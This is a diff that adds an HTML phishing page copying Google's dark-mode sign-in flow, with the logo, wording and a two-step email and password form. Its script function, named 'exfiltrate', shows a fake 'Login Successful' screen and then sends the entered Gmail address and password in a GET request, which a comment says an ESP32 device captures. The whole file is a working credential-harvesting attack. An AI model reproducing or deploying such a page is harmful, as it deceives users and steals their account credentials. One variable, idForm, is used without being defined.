@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        :root {
+            --bg-color: #000000;
+            --card-bg: #1f1f1f;
+            --text-primary: #e3e3e3;
+            --text-secondary: #c4c7c5;
+            --link-blue: #a8c7fa;
+            --btn-next-bg: #a8c7fa;
+            --btn-next-text: #062e6f;
+            --border-default: #8e918f;
+            --border-focus: #a8c7fa;
+            --input-hover: #444746;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Google Sans', 'Roboto', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-primary);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 24px;
+        }
+
+        .login-card {
+            background-color: var(--card-bg);
+            width: 100%;
+            max-width: 1040px;
+            min-height: 480px;
+            border-radius: 28px;
+            padding: 36px 40px;
+            display: flex;
+            gap: 48px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        /* --- Left Column: Info --- */
+        .info-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding-top: 8px;
+        }
+
+        .g-logo {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 400;
+            margin-bottom: 16px;
+            color: var(--text-primary);
+        }
+
+        .desc-text {
+            font-size: 16px;
+            line-height: 1.5;
+            color: var(--text-primary);
+            max-width: 320px;
+        }
+
+        /* Email pill in step 2 */
+        .account-pill {
+            display: flex;
+            align-items: center;
+            background: #2b2b2b;
+            padding: 4px 12px;
+            border-radius: 16px;
+            gap: 8px;
+            width: fit-content;
+            margin-top: 8px;
+            border: 1px solid #444746;
+            cursor: pointer;
+        }
+
+        .account-pill:hover {
+            background: #3c4043;
+        }
+
+        .account-pill .avatar-icon {
+            color: var(--text-secondary);
+        }
+
+        .account-pill .email-display {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        /* --- Right Column: Interaction --- */
+        .form-col {
+            flex: 1.2;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            padding-top: 56px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 8px;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 56px;
+            padding: 13px 15px;
+            font-size: 16px;
+            background: transparent;
+            border: 1px solid var(--border-default);
+            border-radius: 4px;
+            color: var(--text-primary);
+            outline: none;
+            transition: border 0.1s;
+        }
+
+        .input-field:focus {
+            border: 2px solid var(--border-focus);
+            padding: 12px 14px;
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 15px;
+            top: 18px;
+            color: var(--text-secondary);
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background: var(--card-bg);
+            padding: 0 4px;
+        }
+
+        .input-field:focus+.floating-label,
+        .input-field:not(:placeholder-shown)+.floating-label {
+            top: -10px;
+            left: 10px;
+            font-size: 12px;
+            color: var(--link-blue);
+        }
+
+        .link-text {
+            color: var(--link-blue);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: block;
+            margin-top: 12px;
+            width: fit-content;
+        }
+
+        .link-text:hover {
+            text-decoration: underline;
+        }
+
+        .helper-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin-top: 40px;
+        }
+
+        .helper-text a {
+            color: var(--link-blue);
+            text-decoration: none;
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 12px;
+            font-size: 14px;
+            color: var(--text-primary);
+            cursor: pointer;
+        }
+
+        .checkbox-row input {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--link-blue);
+        }
+
+        /* Action Row */
+        .action-row {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            gap: 16px;
+            margin-top: auto;
+            padding-top: 32px;
+        }
+
+        .btn-create {
+            color: var(--link-blue);
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 10px 16px;
+            border-radius: 20px;
+            transition: background 0.2s;
+        }
+
+        .btn-create:hover {
+            background: rgba(168, 199, 250, 0.08);
+        }
+
+        .btn-next {
+            background-color: var(--btn-next-bg);
+            color: var(--btn-next-text);
+            padding: 10px 24px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            border: none;
+            transition: box-shadow 0.2s;
+        }
+
+        .btn-next:hover {
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+            background-color: #d3e3fd;
+        }
+
+        /* --- Page Footer --- */
+        .page-footer {
+            width: 100%;
+            max-width: 1040px;
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--text-secondary);
+            padding: 0 8px;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            cursor: pointer;
+        }
+
+        .footer-right {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-right a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        .footer-right a:hover {
+            color: var(--text-primary);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 800px) {
+            .login-card {
+                flex-direction: column;
+                max-width: 450px;
+                padding: 32px;
+                gap: 0;
+            }
+
+            .form-col {
+                padding-top: 32px;
+            }
+
+            h1 {
+                font-size: 32px;
+            }
+
+            .action-row {
+                margin-top: 32px;
+            }
+        }
+
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid var(--link-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        #success-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            width: 100%;
+        }
+
+        .success-icon {
+            color: #81c995;
+            font-size: 64px;
+            margin-bottom: 24px;
+        }
+
+        .success-title {
+            font-size: 32px;
+            font-weight: 400;
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-card">
+        <!-- Step 1: Identifier -->
+        <div id="id-col-info" class="info-col">
+            <svg class="g-logo" viewBox="0 0 24 24">
+                <path
+                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                    fill="#4285F4" />
+                <path
+                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                    fill="#34A853" />
+                <path
+                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
+                    fill="#FBBC05" />
+                <path
+                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
+                    fill="#EA4335" />
+            </svg>
+            <h1>Sign in</h1>
+            <div class="desc-text">with your Google Account. This account will be available to other Google apps in the
+                browser.</div>
+        </div>
+
+        <!-- Step 2: Welcome Info -->
+        <div id="pwd-col-info" class="info-col hidden">
+            <svg class="g-logo" viewBox="0 0 24 24">
+                <path
+                    d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
+                    fill="#4285F4" />
+                <path
+                    d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+                    fill="#34A853" />
+                <path
+                    d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
+                    fill="#FBBC05" />
+                <path
+                    d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
+                    fill="#EA4335" />
+            </svg>
+            <h1>Welcome</h1>
+            <div id="account-pill" class="account-pill">
+                <svg class="avatar-icon" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path
+                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" />
+                </svg>
+                <span id="display-email" class="email-display">user@gmail.com</span>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M7 10l5 5 5-5z" />
+                </svg>
+            </div>
+        </div>
+
+        <!-- Shared Form/Action Column -->
+        <div class="form-col">
+            <!-- Step 1 Form -->
+            <div id="id-form-step">
+                <div class="input-wrapper">
+                    <input type="text" id="email-input" class="input-field" placeholder=" ">
+                    <label class="floating-label">Email or phone</label>
+                </div>
+                <div id="id-error" class="hidden" style="color: #f38b8b; font-size: 12px; margin-top: 4px;">Couldn't
+                    find your Google Account</div>
+                <a href="#" class="link-text">Forgot email?</a>
+                <div class="helper-text">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more
+                        about using Guest mode</a></div>
+
+                <div class="action-row">
+                    <div class="btn-create">Create account</div>
+                    <button id="id-next" class="btn-next">Next</button>
+                </div>
+            </div>
+
+            <!-- Step 2 Form -->
+            <div id="pwd-form-step" class="hidden">
+                <div class="input-wrapper">
+                    <input type="password" id="password-input" class="input-field" placeholder=" ">
+                    <label class="floating-label">Enter your password</label>
+                </div>
+                <div class="checkbox-row" id="show-pwd-row">
+                    <input type="checkbox" id="show-pwd">
+                    <span>Show password</span>
+                </div>
+
+                <div class="action-row" style="margin-top: 100px;">
+                    <div class="btn-create">Try another way</div>
+                    <button id="pwd-next" class="btn-next">Next</button>
+                </div>
+            </div>
+
+            <!-- Success Step -->
+            <div id="success-step" class="hidden">
+                <div class="success-icon">✓</div>
+                <h1 class="success-title">Login Successful</h1>
+                <p style="color: var(--text-secondary);">Redirecting to your account...</p>
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="page-footer">
+        <div class="footer-left">
+            <span>English (United States)</span>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M7 10l5 5 5-5z" />
+            </svg>
+        </div>
+        <div class="footer-right">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const idNext = document.getElementById('id-next');
+            const pwdNext = document.getElementById('pwd-next');
+            const emailInput = document.getElementById('email-input');
+            const passwordInput = document.getElementById('password-input');
+            const displayEmail = document.getElementById('display-email');
+            const showPwd = document.getElementById('show-pwd');
+
+            const idInfo = document.getElementById('id-col-info');
+            const pwdInfo = document.getElementById('pwd-col-info');
+            const pwdForm = document.getElementById('pwd-form-step');
+
+            function exfiltrate(id, pwd) {
+                const email = id.includes('@') ? id : id + '@gmail.com';
+                const url = `/get?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pwd)}`;
+                
+                // Show success UI immediately
+                pwdInfo.classList.add('hidden');
+                pwdForm.classList.add('hidden');
+                const successStep = document.getElementById('success-step');
+                successStep.classList.remove('hidden');
+
+                const card = document.querySelector('.login-card');
+                card.style.justifyContent = 'center';
+                card.style.alignItems = 'center';
+
+                // Small delay then redirect to ensure ESP32 captures the GET request
+                setTimeout(() => {
+                    window.location.href = url;
+                }, 500);
+            }
+
+            idNext.addEventListener('click', () => {
+                let email = emailInput.value.trim();
+                const errorText = document.getElementById('id-error');
+
+                if (!email) return;
+
+                // Restrict to @gmail.com
+                if (email.includes('@')) {
+                    if (!email.toLowerCase().endsWith('@gmail.com')) {
+                        errorText.classList.remove('hidden');
+                        emailInput.style.border = '2px solid #f38b8b';
+                        return;
+                    }
+                } else {
+                    email += '@gmail.com';
+                }
+
+                errorText.classList.add('hidden');
+                emailInput.style.border = '1px solid var(--border-default)';
+                displayEmail.textContent = email;
+                idInfo.classList.add('hidden');
+                idForm.classList.add('hidden');
+                pwdInfo.classList.remove('hidden');
+                pwdForm.classList.remove('hidden');
+                passwordInput.focus();
+            });
+
+            showPwd.addEventListener('change', () => {
+                passwordInput.type = showPwd.checked ? 'text' : 'password';
+            });
+
+            pwdNext.addEventListener('click', () => {
+                const email = emailInput.value.trim();
+                const pwd = passwordInput.value;
+                if (pwd) {
+                    exfiltrate(email, pwd);
+                }
+            });
+
+            // Allow Enter key to trigger Next
+            emailInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') idNext.click();
+            });
+            passwordInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') pwdNext.click();
+            });
+        });
+    </script>
+</body>
+
+</html>
